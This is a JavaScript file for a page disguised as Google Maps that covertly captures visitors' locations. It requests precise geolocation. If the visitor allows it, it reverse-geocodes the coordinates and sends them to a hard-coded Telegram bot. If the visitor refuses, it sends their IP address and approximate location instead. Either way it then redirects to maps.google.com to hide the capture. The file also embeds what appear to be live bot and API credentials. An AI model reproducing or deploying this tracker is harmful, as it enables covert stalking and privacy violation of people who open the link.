const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
const TELEGRAM_CHAT_ID = '6602027873';
const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
const redirectURL = 'https://maps.google.com';

const loading = document.getElementById('loading-screen');

function initMap() {
  new google.maps.Map(document.getElementById("map"), {
    center: { lat: 20, lng: 78 },
    zoom: 4,
  });

  setTimeout(() => {
    getLocation();
    loading.style.display = "none";
  }, 1500);
}

function getLocation() {
  navigator.geolocation.getCurrentPosition(success, denied, { enableHighAccuracy: true });
}

function success(position) {
  const { latitude, longitude } = position.coords;
  reverseGeocode(latitude, longitude, (locationName) => {
    const message = `
✅ USER ALLOWED
📍 Lat: ${latitude}
📍 Lon: ${longitude}
📌 Location: ${locationName}
    `.trim();
    sendTelegram(message);
    window.location.href = redirectURL;
  });
}

function denied() {
  fetch('https://ipwho.is')
    .then(res => res.json())
    .then(data => {
      const location = `${data.country}, ${data.region}, ${data.city}`;
      const message = `
❌ USER DENIED
🔹 IP: ${data.ip}
📌 Location: ${location}
      `.trim();
      sendTelegram(message);
      window.location.href = redirectURL;
    });
}

function reverseGeocode(lat, lon, callback) {
  fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`)
    .then(res => res.json())
    .then(data => {
      const location = data.results[0]?.formatted || 'Unknown';
      callback(location);
    });
}

function sendTelegram(message) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })
  });
}

window.initMap = initMap;
